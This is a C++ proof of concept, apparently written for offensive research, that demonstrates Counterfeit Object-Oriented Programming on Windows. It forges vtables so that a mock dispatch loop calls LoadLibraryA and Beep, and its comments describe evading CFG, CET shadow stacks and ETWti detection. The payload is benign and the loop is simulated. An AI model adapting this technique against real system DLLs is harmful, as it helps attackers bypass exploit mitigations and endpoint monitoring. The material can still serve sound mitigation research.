#include <windows.h>
#include <stdio.h>

// Fox's COOP (Counterfeit Object-Oriented Programming) PoC
// The "Architect" approach: No shellcode, no ROP, no RET spoofing.
// We weaponize legitimate C++ virtual dispatch loops inside signed Microsoft DLLs.

// ---------------------------------------------------------
// 1. THE ENVIRONMENT (What already exists in the OS)
// ---------------------------------------------------------
// Imagine this class and loop exist inside combase.dll or rpcrt4.dll.
// We don't write this code; we just find it in memory via reverse engineering.
class IOSDispatcher {
public:
    virtual void Dispatch(PVOID context) = 0;
};

// The legitimate OS loop that iterates over an array of objects and calls their virtual function.
void LegitimateMicrosoftDispatchLoop(IOSDispatcher** objects, int count, PVOID context) {
    for (int i = 0; i < count; i++) {
        // This is a forward-edge indirect call. CFG checks it, but allows it if the target is valid.
        // CET doesn't care because it's a legitimate CALL, and the RET will naturally return here.
        objects[i]->Dispatch(context);
    }
}

// ---------------------------------------------------------
// 2. THE ARCHITECT'S WEAPON (Data-Only Payload)
// ---------------------------------------------------------
// We don't write shellcode. We forge data structures in memory to look like C++ objects.

// A forged vtable that points to legitimate Windows APIs instead of the expected methods.
typedef void (*fnTargetApi)(PVOID);

struct ForgedVTable {
    fnTargetApi DispatchMethod;
};

struct ForgedObject {
    ForgedVTable* vfptr;
    PVOID Argument; // Some loops pass object members as arguments, others pass loop context
};

int main() {
    printf("[+] Starting COOP (Counterfeit Object-Oriented Programming) PoC.\n");

    // 1. Resolve the APIs we want to execute. These are valid CFG targets.
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    fnTargetApi pLoadLibraryA = (fnTargetApi)GetProcAddress(hKernel32, "LoadLibraryA");
    
    // Using Beep as a benign secondary payload to prove chaining
    fnTargetApi pBeep = (fnTargetApi)GetProcAddress(hKernel32, "Beep"); 

    // 2. Forge the VTables in standard RW memory (Heap/Stack). No RWX needed.
    ForgedVTable vtable1 = { pLoadLibraryA };
    ForgedVTable vtable2 = { pBeep };

    // 3. Forge the Objects
    ForgedObject obj1 = { &vtable1, NULL };
    ForgedObject obj2 = { &vtable2, NULL };

    // Create the array of pointers to our forged objects
    IOSDispatcher* forgedList[2];
    forgedList[0] = (IOSDispatcher*)&obj1;
    forgedList[1] = (IOSDispatcher*)&obj2;

    printf("[+] Forged object array created in RW memory. No RWX/RX memory allocated.\n");
    printf("[+] Triggering legitimate OS dispatch loop...\n");

    // 4. The Execution
    // We pass our forged data to the legitimate Microsoft loop.
    // In reality, we'd trigger this by sending a specific RPC message, ALPC port message,
    // or triggering a COM interface that causes the OS to process our data structure.
    
    // When the loop runs:
    // - CFG sees an indirect call to LoadLibraryA. It's a valid export, so CFG allows it.
    // - LoadLibraryA executes. If ETWti checks the call stack, it sees the call came 
    //   directly from LegitimateMicrosoftDispatchLoop inside a signed DLL. Perfect OPSEC.
    // - LoadLibraryA returns naturally to the loop. CET's shadow stack is perfectly matched.
    
    // We pass "user32.dll" as the context, which the mock loop passes to the virtual function.
    LegitimateMicrosoftDispatchLoop(forgedList, 2, (PVOID)"user32.dll");

    printf("[!] Execution complete. Zero shellcode. Zero ROP. Zero CET violations.\n");

    return 0;
}